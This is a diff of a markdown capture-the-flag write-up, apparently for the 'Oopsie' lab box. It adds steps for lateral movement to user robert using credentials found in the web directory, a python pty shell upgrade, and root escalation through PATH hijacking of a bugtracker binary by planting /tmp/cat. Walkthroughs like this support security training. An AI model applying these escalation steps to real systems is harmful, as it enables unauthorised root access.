@@ -54,7 +54,7 @@ User flag can be found on ```/home/robert```
 
 ![userflag](/assets/img/Oopsie/user_flag.png)
 
-## **Lateral movement**
+## **Lateral Movement**
 
 
 Credential of username **"robert"**  can be found at ```/var/www/html/cdn-cgi/login ```. Before we continue as user robert I want to upgrade my shell a little bit to be able to use **su** command : ```python3 -c 'import pty;pty.spawn("/bin/bash")' ```
@@ -64,12 +64,28 @@ Credential of username **"robert"**  can be found at ```/var/www/html/cdn-cgi/lo
 
 Check basic command such as ```sudo -l``` to check if I can easily use **sudo** to **privilege escalation**, unfortunately we can't. Next check **id** of the user. What i noticed is ```1001(bugtracker)```
 
-![[Pasted image 20260628191153.png]]
+![sudo](sudo.png)
+
+## **Privilege Escalation**
+
+I use ```find / -group bugtracker 2>/dev/null ``` to find any directory, folder, file that is relevant to **bugtacker** group. the path is ```/usr/bin ``` 
+then i want to check behaviour of the program by ```strings bugtracker```. The result is it didn't use **absolute path**
 
 
-I use ```find / -group bugtracker 2>/dev/null ``` to find any directory, folder, file that is relevant to **bugtacker** group.
+![bugtracker](bugtracker.png)
+![path](path.png)
 
-![[Pasted image 20260628192047.png]]
+that mean we can ultilize teqnique called **"Path Hijacking"**.
+```echo '/bin/bash' > /tmp/cat ```
+```chmod +x /tmp/cat```
+```PATH=/tmp:$PATH ```
+```export PATH```
 
+then run the program again, this time we escalate as root.
 
+![path](path_hijacking.png)
+
+Root flag can be found at ```/root```
+
+![rootflag](root_flag.png)
 
